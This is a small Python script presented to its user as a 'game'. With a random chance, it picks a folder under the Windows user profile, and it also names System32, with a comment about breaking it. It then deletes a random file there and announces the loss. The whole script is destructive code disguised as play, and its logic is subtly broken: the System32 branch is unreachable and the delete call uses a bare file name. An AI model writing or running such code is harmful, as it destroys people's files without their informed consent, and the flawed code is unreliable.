import random
import os
import getpass

user = getpass.getuser()
randomiser = random.randint(0,6)
paths = ["DOCUMENTS", "DOWNLOADS", "DESKTOP", "LINKS", "MUSIC", "VIDEOS", "SYSTEM32"]

def dora(location):
    DIR_ROOT = f"C:/Users/{user}"
    if location in paths:
        DIR = os.listdir(DIR_ROOT + f"/{location}")
    elif location == "SYSTEM32":
        DIR = os.listdir("C:/Windows/System32")  # Break the good shit

    return DIR

def bingo():
    location = random.choice(paths)
    directory = dora(location)
    oof = random.choice(directory)

    os.remove(oof)

    print(f"Bang {oof} is gone :(")

def main():
    go = str(input("Want to play a game? :) [Y / N]:"))

    if go.upper() == "N":
        exit()
    elif go.upper() == "Y":
        if randomiser == 1:
            location = random.choice(paths)
            bingo()
        else:
            print("Hmmmmmm")
    else:
        main()
main()
